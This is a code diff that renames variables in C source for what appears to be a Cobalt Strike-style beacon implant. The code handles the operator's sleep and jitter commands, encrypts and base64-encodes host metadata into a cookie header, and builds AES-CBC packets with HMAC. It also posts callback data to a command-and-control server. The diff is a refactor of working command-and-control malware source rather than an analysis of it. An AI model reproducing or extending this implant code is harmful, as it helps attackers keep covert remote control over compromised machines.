@@ -3,9 +3,9 @@
 #include "Http.h"
 #pragma warning(disable:4996)
 
-VOID CmdChangSleepTimes(unsigned char* command, size_t command_length) {
+VOID CmdChangSleepTimes(unsigned char* command_buffer, size_t command_length) {
     datap parser;
-    BeaconDataParse(&parser, command, command_length);
+    BeaconDataParse(&parser, command_buffer, command_length);
 
     g_sleeptime = BeaconDataInt(&parser);
 	g_jitter = BeaconDataInt(&parser);
@@ -15,89 +15,89 @@ VOID CmdChangSleepTimes(unsigned char* command, size_t command_length) {
 }
 
 VOID FreeEncryptMetadataResult(EncryptMetadataResult* r) {
-    if (r && r->EncryptMetaData) {
-        free(r->EncryptMetaData);
-        r->EncryptMetaData = NULL;
-        r->EncryptMetaDataLen = 0;
+    if (r && r->EncryptMetadata) {
+        free(r->EncryptMetadata);
+        r->EncryptMetadata = NULL;
+        r->EncryptMetadataLen = 0;
     }
 }
 
 wchar_t* makeMetaData() {
-    EncryptMetadataResult EncryptMetaInfos = EncryMetadata();
-    unsigned char* EncryptMetaInfo = EncryptMetaInfos.EncryptMetaData;
-    size_t EncryptMetaInfolen = EncryptMetaInfos.EncryptMetaDataLen;
+    EncryptMetadataResult encrypt_meta_info = encryptMetadata();
+    unsigned char* enc_meta_info = encrypt_meta_info.EncryptMetadata;
+    size_t EncryptMetaInfolen = encrypt_meta_info.EncryptMetadataLen;
 
-    if (!EncryptMetaInfo || EncryptMetaInfolen <= 0) {
-        fprintf(stderr, "EncryMetadata failed\n");
+    if (!enc_meta_info || EncryptMetaInfolen <= 0) {
+        fprintf(stderr, "encryptMetadata failed\n");
         return NULL;
     }
 
-    unsigned char* baseEncodeMetadata = base64Encode(EncryptMetaInfo, EncryptMetaInfolen);
-	FreeEncryptMetadataResult(&EncryptMetaInfos);
-    if (!baseEncodeMetadata) {
+    unsigned char* base64_enc_meta = base64Encode(enc_meta_info, EncryptMetaInfolen);
+	FreeEncryptMetadataResult(&encrypt_meta_info);
+    if (!base64_enc_meta) {
 		fprintf(stderr, "base64Encode failed\n");
         return NULL;
     }
 
     size_t headers_length = strlen(g_metadata_header) + strlen(g_metadata_prepend);
 
-    unsigned char* headerStart = (unsigned char*)malloc(headers_length + 1);
-    if (!headerStart) {
+    unsigned char* headers_start = (unsigned char*)malloc(headers_length + 1);
+    if (!headers_start) {
         fprintf(stderr, "Memory allocation failed\n");
-        free(baseEncodeMetadata);
+        free(base64_enc_meta);
         return NULL;
     }
 
-    memcpy(headerStart, g_metadata_header, strlen(g_metadata_header));
-    memcpy(headerStart + strlen(g_metadata_header), g_metadata_prepend, strlen(g_metadata_prepend));
-    headerStart[headers_length] = '\0';
+    memcpy(headers_start, g_metadata_header, strlen(g_metadata_header));
+    memcpy(headers_start + strlen(g_metadata_header), g_metadata_prepend, strlen(g_metadata_prepend));
+    headers_start[headers_length] = '\0';
 
-    size_t cookieLen = strlen(headerStart) + strlen(baseEncodeMetadata);
-    unsigned char* cookieStr = (unsigned char*)malloc(cookieLen + 1);
-    if (!cookieStr) {
+    size_t cookie_length = strlen(headers_start) + strlen(base64_enc_meta);
+    unsigned char* cookie_data = (unsigned char*)malloc(cookie_length + 1);
+    if (!cookie_data) {
         fprintf(stderr, "Memory allocation failed\n");
-        free(headerStart);
-        free(baseEncodeMetadata);
+        free(headers_start);
+        free(base64_enc_meta);
         return NULL;
     }
 
-    snprintf((char*)cookieStr, cookieLen + 1, "%s%s", headerStart, baseEncodeMetadata);
+    snprintf((char*)cookie_data, cookie_length + 1, "%s%s", headers_start, base64_enc_meta);
 
 
-	free(headerStart);
-	free(baseEncodeMetadata);
+	free(headers_start);
+	free(base64_enc_meta);
 
     // 先计算宽字符长度（包含结尾 \0）
-    int wideLen = MultiByteToWideChar(CP_ACP, 0, (char*)cookieStr, -1, NULL, 0);
+    int wideLen = MultiByteToWideChar(CP_ACP, 0, (char*)cookie_data, -1, NULL, 0);
     if (wideLen == 0) {
         fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n", GetLastError());
-        free(cookieStr);
+        free(cookie_data);
         return NULL;
     }
 
     // 分配 wideLen（字符串 + 末尾\0）+ 2（\r \n）+ 1（新的\0）
-    wchar_t* wCookieStr = (wchar_t*)malloc((wideLen + 2) * sizeof(wchar_t));
-    if (!wCookieStr) {
+    wchar_t* wcookie_data = (wchar_t*)malloc((wideLen + 2) * sizeof(wchar_t));
+    if (!wcookie_data) {
         fprintf(stderr, "Memory allocation failed\n");
-        free(cookieStr);
+        free(cookie_data);
         return NULL;
     }
 
-    if (MultiByteToWideChar(CP_ACP, 0, (unsigned char*)cookieStr, -1, wCookieStr, wideLen) == 0) {
+    if (MultiByteToWideChar(CP_ACP, 0, (unsigned char*)cookie_data, -1, wcookie_data, wideLen) == 0) {
         fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n", GetLastError());
-        free(cookieStr);
-        free(wCookieStr);
+        free(cookie_data);
+        free(wcookie_data);
         return NULL;
     }
 
     // 追加 CRLF，覆盖原有的 \0
-    wCookieStr[wideLen - 1] = L'\r';
-    wCookieStr[wideLen] = L'\n';
-    wCookieStr[wideLen + 1] = L'\0';
+    wcookie_data[wideLen - 1] = L'\r';
+    wcookie_data[wideLen] = L'\n';
+    wcookie_data[wideLen + 1] = L'\0';
 
-    free(cookieStr);
+    free(cookie_data);
 
-	return wCookieStr;
+	return wcookie_data;
 }
 
 static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_capacity, unsigned char* data, size_t dataLen) {
@@ -118,7 +118,7 @@ static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_cap
     return TRUE;
 }
 
-unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* msg_length) {
+unsigned char* MakePacket(int callback, unsigned char* post_buffer, size_t post_length, size_t* packet_length) {
     g_counter += 1;
 
     // 初始缓冲区容量
@@ -139,9 +139,9 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
         return NULL;
     }
 
-    // 写入结果长度（仅当 postMsg 存在时）
-    if (postMsg) {
-        uint32_t result_total_len = (uint32_t)msgLen + 4;
+    // 写入结果长度（仅当 post_buffer 存在时）
+    if (post_buffer) {
+        uint32_t result_total_len = (uint32_t)post_length + 4;
 
         uint8_t result_len_be[4];
         PutUint32BigEndian(result_len_be, result_total_len);
@@ -163,10 +163,10 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
         return NULL;
     }
 
-    // 添加 postMsg
-    if (postMsg && msgLen > 0) {
-        if (!append_data(&buf, &buf_length, &buf_capacity, postMsg, msgLen)) {
-			fprintf(stderr, "append_data failed for postMsg\n");
+    // 添加 post_buffer
+    if (post_buffer && post_length > 0) {
+        if (!append_data(&buf, &buf_length, &buf_capacity, post_buffer, post_length)) {
+			fprintf(stderr, "append_data failed for post_buffer\n");
             return NULL;
         }
     }
@@ -174,11 +174,11 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
     size_t cipher_len = 0;
 
     // AES CBC 加密（输出包含 16 字节 IV + ciphertext）
-    unsigned char* cipher_buf = AesCBCEncrypt(buf, g_aeskey, buf_length, &cipher_len);
+    unsigned char* cipher_buf = Aes_CBC_Encrypt(buf, g_aeskey, buf_length, &cipher_len);
     free(buf);
 
     if (!cipher_buf) {
-        fprintf(stderr, "AesCBCEncrypt failed\n");
+        fprintf(stderr, "Aes_CBC_Encrypt failed\n");
         return NULL;
     }
 
@@ -209,7 +209,7 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
     unsigned char* hmac_buf = HMkey(ciphertext_ptr, ciphertext_len);
     memcpy(packet_buf + 4 + ciphertext_len, hmac_buf, 16);
 
-    *msg_length = packet_len;
+    *packet_length = packet_len;
 
     free(hmac_buf);
     free(cipher_buf);
@@ -217,14 +217,14 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
     return packet_buf;
 }
 
-VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType) {
-    unsigned char* BeaconIdHeader = makeBeaconIdHeader();
-    unsigned char* postData = makePostData(postMsg, msgLen, callbackType);
-    size_t dataSize = strlen(postData);
+VOID DataProcess(unsigned char* post_buffer, size_t post_length, int callbackType) {
+    unsigned char* beacon_id_header = make_beacon_id_header();
+    unsigned char* post_data = make_post_data(post_buffer, post_length, callbackType);
+    size_t post_data_length = strlen(post_data);
 
-	wchar_t* BeaconIdWideHeader = convertToWideChar(BeaconIdHeader);
+	wchar_t* beacon_id_wheader = convert_2_wchar(beacon_id_header);
 
-    POST(postData, dataSize, BeaconIdWideHeader);
-	free(postData);
-    free(BeaconIdHeader);
+    POST(post_data, post_data_length, beacon_id_wheader);
+	free(post_data);
+    free(beacon_id_header);
 }
